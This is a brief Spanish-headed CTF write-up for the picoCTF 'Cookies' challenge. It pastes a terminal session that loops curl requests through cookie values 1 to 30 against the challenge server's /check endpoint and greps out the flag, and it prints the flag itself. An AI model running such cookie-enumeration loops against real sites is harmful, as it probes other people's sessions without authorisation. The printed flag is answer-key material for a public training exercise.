# Reto
## Descripción
Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:55983/
## Solución
### Solucion

```
kie'
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
curl: (3) URL using bad/illegal format or missing URL
curl: (6) Could not resolve host: h
curl: (6) Could not resolve host: cookie
neylar11-picoctf@webshell:~$ for i in {1..30}; do curl -s http://mercury.picoctf.net:61871/check -H "Cookie: name=$i"; done | grep pico
neylar11-picoctf@webshell:~$ curl http://mercury.picoctf.net:61871/check -H "Cookie: n
ame=1"
curl: (6) Could not resolve host: mercury.picoctf.net
neylar11-picoctf@webshell:~$ curl http://mercury.picoctf.net:61871/ check -H "Cookie: 
name=1"
curl: (6) Could not resolve host: mercury.picoctf.net
curl: (6) Could not resolve host: check
neylar11-picoctf@webshell:~$ curl http://wily-courier.picoctf.net:61871/ check -H "Coo
kie: name=1"
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/check">/check</a>. If not, click the link.
curl: (6) Could not resolve host: check
neylar11-picoctf@webshell:~$ for i in {1..30}; do curl -s http://wily-courier.picoctf.net:61871/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
## Notas


## Referencias
